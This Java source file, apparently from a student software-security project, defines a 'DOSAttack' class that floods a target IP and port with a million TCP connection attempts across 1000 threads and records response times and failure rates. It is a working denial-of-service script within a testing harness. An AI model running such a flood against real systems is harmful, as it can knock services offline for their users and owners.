package fr.isep.softsecu.attackreport.attacks;

import fr.isep.softsecu.attackreport.Attack;
import fr.isep.softsecu.attackreport.Report;

import java.net.InetSocketAddress;
import java.net.Socket;
import java.time.Instant;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

public class DOSAttack implements Attack {
    @Override
    public void run(Report report, String ip, int port) {
        System.out.println("DOS attack on " + ip + ":" + port);
        ExecutorService es = Executors.newFixedThreadPool(1000);

        List<Future<DOSResult>> futures = new ArrayList<>();
        for (int i = 0; i < 1000; i++) {
            futures.add(dos(es, ip, port, i));
        }

        es.shutdown();

        double meanDuration = 0;
        double meanFailures = 0;
        for (int i = 0; i < futures.size(); ++i){
            Future<DOSResult> f = futures.get(i);
            try {
                meanDuration += f.get().meanTime()/futures.size();
                meanFailures += f.get().failuresPercent()/futures.size();
                System.out.println("Attack " + i + "/" + futures.size() + " - Mean duration: " + f.get().meanTime() + "ms - Failures: " + f.get().failuresPercent());
            } catch (Exception e) {
                meanFailures++;
            }
        }

        System.out.println("DOS attack on " + ip + ":" + port + " finished");
        System.out.println("Mean duration: " + meanDuration + "ms");
        System.out.println("Failures: " + (meanFailures*100) + "%");

        report.append("Mean duration: " + meanDuration + "ms");
        report.append("Failures: " + (meanFailures*100) + "%");
    }

    private Future<DOSResult> dos(ExecutorService es, String ip, int port, int attackNumber) {
        return es.submit(() -> {
            final double tries = 1000;
            double meanDuration = 0;
            double failures = 0;
            for(int i = 0; i < tries; ++i) {
                try(Socket socket = new Socket()) {
                    Instant start = Instant.now();
                    socket.connect(new InetSocketAddress(ip, port), 1000);
                    Instant end = Instant.now();
                    long duration = end.toEpochMilli() - start.toEpochMilli();
                    meanDuration += duration/tries;

                    System.out.println("Attack " + attackNumber + " - " + i + "/" + tries + " - Duration: " + duration + "ms");
                } catch (Exception e) {
                    failures++;
                }
            }

            return new DOSResult(meanDuration, failures/tries);
        });
    }

    @Override
    public String getAttackName() {
        return "DOS attack";
    }

    public record DOSResult(double meanTime, double failuresPercent){}
}
